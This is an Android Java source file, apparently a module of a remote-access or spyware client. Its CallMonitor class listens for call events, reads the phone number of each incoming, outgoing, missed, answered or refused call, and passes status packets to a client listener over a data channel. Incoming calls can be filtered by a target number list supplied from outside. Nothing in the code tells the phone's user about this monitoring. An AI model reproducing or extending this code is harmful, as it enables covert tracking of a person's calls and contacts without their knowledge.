package my.app.Library;

import java.util.HashSet;

import utils.EncoderHelper;
import my.app.client.Client;
import my.app.client.ClientListener;
import Packet.CallStatusPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Diese Klasse ist zum Livemonitoren von eingehenden und ausgehenden Anrufen gedacht.
 */
public class CallMonitor {
	/**
	 * ctx Service der das Objekt erstellt
	 */
	ClientListener ctx;
	/**
	 * phoneNumberFilter Nummer nachdenen die eingehenden/ausgehenden Anrufe gefilter werden.
	 */
	HashSet<String> phoneNumberFilter;
	/**
	 * channel Datenübertragungskanal
	 */
	int channel;
	/**
	 * Boolean ob ausgehender Anruf
	 */
	Boolean isCalling = false;

	/**
	 * Konstruktor der Klasse erstellt einen Intentfilter für eingehende und ausgehende Anrufe.
	 * Zusätzlich werden die Klassenvariablen intialisiert
	 * @param c	Der Service der das Objekt erstellt
	 * @param chan	Datenübertragungskanal
	 * @param args	Liste der Nummer nach denen gefiltert wird.
	 */
	public CallMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.PHONE_STATE"); //On enregistre un broadcast receiver sur la reception de SMS
        filter.addAction("android.intent.action.NEW_OUTGOING_CALL");
        ctx.registerReceiver(Callreceiver, filter);
	}

	/**
	 * Beende des BroadcastReceiver.
	 */
	public void stop() {
		ctx.unregisterReceiver(Callreceiver);
	}

	/**
	 * Erstellen des BroadcastReceiver.
	 */
	protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		 private static final String TAG = "CallReceiver";
		/**
		 * Kommt ein Intent an, welcher die Bedingungen des Filters erfüllt, wird dieser hier verarbeitet.
		 * @param context Der Kontext
		 * @param intent Der ankommende Intent
		 */
		@Override

		public void onReceive(final Context context, final Intent intent) {
			//Log.i(TAG, "Call state changed !");
			/**
			 * Die Intent-Action wird in der Variablen action gespeichert.
			 */
			final String action = intent.getAction();
			/**
			 * Überprüfen ob es sich um einen ausgehenden Anruf handelt.
 			 */
			if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)){
				/**
				 * Auslesen der Telefonnummer.
				 */
				String number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				Log.i(TAG,"Outgoing call to "+number);
				/**
				 * Neues Callstatuspacket erstellen und in diesem die Telefonnummer und den Status übergeben.
				 */
				ctx.handleData(channel, new CallStatusPacket(4, number).build());
				/**
				 * isCalling wir auf true gesetzt.
				 */
				isCalling = true;
			}
			/**
			 * Überprüfen ob es ein eingehender Anruf ist.
			 */
			else if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
				/**
				 * Extra Status für eingehende Anrufe auslesen und in phoneState speichern.
				 */
				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				/**
				 * Nummer des eingehenden Anrufs auslesen und in phoneNumber speichern.
				 */
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				/**
				 * Überprüfen ob es eine Nummer und einen Filter gibt.
				 */
				if(phoneNumber != null && phoneNumberFilter != null) {
					/**
					 * Wenn ein Filter vorhanden überprüfen, ob die Nummer im Filter vorkommt.
					 * Ist die nicht der Fall wird die Methode beendet.
					 */
					if(!phoneNumberFilter.contains(phoneNumber))
						return;
				}
				/**
				 * Überprüfen ob der Anruf immer noch klingelt.
				 */
				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					//Log.i(TAG,"Incoming call of"+phoneNumber);
					/**
					 * Entsprechende CallStatusPacket erstellen und abschicken.
					 */
					ctx.handleData(channel, new CallStatusPacket(1, phoneNumber).build());
				}
				/**
				 * Überprüfen ob der Anruf beendet oder abgelehtn wurde.
				 */
				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
					if(phoneNumber == null) {
						Log.i(TAG, "Hang Up/Refused");
						/**
						 * Entprechendes CallStatusPacket erstellen und abschicken.
						 */
						ctx.handleData(channel, new CallStatusPacket(5, phoneNumber).build());
					}
					else {
						/**
						 * Wenn dieser Teil erreicht wird so wurde der Anruf verpasst.
						 */
						Log.i(TAG,"Missed call of "+phoneNumber); //not null call missed, null hang up, or refused
						/**
						 * Erstellen des entsprechenden CallStatusPackets.
						 */
						ctx.handleData(channel, new CallStatusPacket(2, phoneNumber).build());
					}
					/**
					 * isCalling auf false setzen.
					 */
					isCalling = false;
				}
				/**
				 * Überprüfen ob es einen Anruf gibt, der gerade wählt, aktiv ist oder pausiert.
				 */
				else if(phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
					/**
					 * aktiver anruf
					 */
					if(!isCalling) {
						Log.i(TAG,"Reçu décroché of "+phoneNumber);
						/**
						 * CallStatuspacket erstellen und versenden.
						 */
						ctx.handleData(channel, new CallStatusPacket(3, phoneNumber).build());
					}
				}
			}
		}

	 };
	
	
	
}
